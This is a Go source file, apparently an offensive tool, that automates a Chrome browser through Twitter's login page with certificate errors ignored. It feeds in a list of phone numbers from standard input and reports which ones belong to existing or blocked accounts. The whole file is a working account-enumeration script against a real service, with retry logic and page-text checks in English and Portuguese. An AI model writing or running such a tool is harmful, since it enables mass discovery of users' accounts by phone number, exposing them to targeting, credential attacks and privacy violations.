package bruteforceSite

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/chromedp/chromedp/kb"
)

func BruteTwitter() {

	payloads := []string{}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		payloads = append(payloads, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Erro de leitura:", err)
	}
	url := "https://twitter.com/i/flow/login"
	maxTrys := 2
	options := []chromedp.ExecAllocatorOption{
		chromedp.Flag("ignore-certificate-errors", "1"),
		chromedp.Flag("headless", false), // set headless to false
		chromedp.Flag("disable-gpu", true),
	}

	for indexPayload := 0; indexPayload < len(payloads); indexPayload++ {
		numberphone := payloads[indexPayload]
		for i := 1; i <= maxTrys; i++ {
			ctx, cancel := chromedp.NewContext(
				context.Background(),
				chromedp.WithDebugf(log.Printf),
			)
			defer cancel()
			ctx, cancel = chromedp.NewExecAllocator(ctx, options...)
			defer cancel()
			ctx, cancel = chromedp.NewContext(ctx)
			defer cancel()
			ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
			defer cancel()
			err := chromedp.Run(ctx,
				chromedp.Navigate(url),
				chromedp.WaitVisible(`input`, chromedp.ByQuery), // substitua 'inputID' pelo ID do seu elemento de entrada
			)
			if err != nil {
				log.Println(err)

				if i != maxTrys {
					log.Println("[/] Tentando novamente:", numberphone)
					continue
				}
			}
			fmt.Println("[-] Trying Number:", numberphone)
			defer cancel()
			passwordExist := ""
			accountExist := ""
			blockedExist := ""
			err = chromedp.Run(ctx,
				chromedp.SendKeys(`input`, numberphone, chromedp.ByQuery),
				chromedp.Sleep(1*time.Second),
				chromedp.KeyEvent(kb.Enter),
				chromedp.Sleep(1*time.Second),
				chromedp.Evaluate(`(document.body.innerText.indexOf("Sorry, we could not find your account.") > -1 || document.body.innerText.indexOf("Desculpe, mas não encontramos sua conta.") > -1)?"NOT":"YES"`, &accountExist),
			)
			if err != nil {
				log.Println(err)
				if i != maxTrys {
					log.Println("[-] Tentando novamente:", numberphone)
					continue
				}
			}
			if accountExist == "YES" {
				err = chromedp.Run(ctx,
					chromedp.Sleep((15/10)*time.Second),
					chromedp.Evaluate(`document.getElementsByName("password")[0]?"password":""`, &passwordExist),
					chromedp.Evaluate(`document.body.querySelector("a[href='https://help.twitter.com/forms/account-access/regain-access']")?"blocked":""`, &blockedExist),
				)
				if err != nil {
					log.Println(err)

					if i != maxTrys {
						log.Println("[-] Tentando novamente:", numberphone)
						continue
					}
				}
			}
			// Verificar se ele respondeu com usuário não existente
			// Verificar se ele respondeu com campo de senha
			// Sorry, we could not find your account.
			// Desculpe, mas não encontramos sua conta.

			if passwordExist != "" {
				fmt.Println("[!] Account Exist:", numberphone)
			}
			if blockedExist == "blocked" {
				fmt.Println("[!] User Blocked")
				indexPayload--
			}
			defer cancel()
			break
		}
	}
}
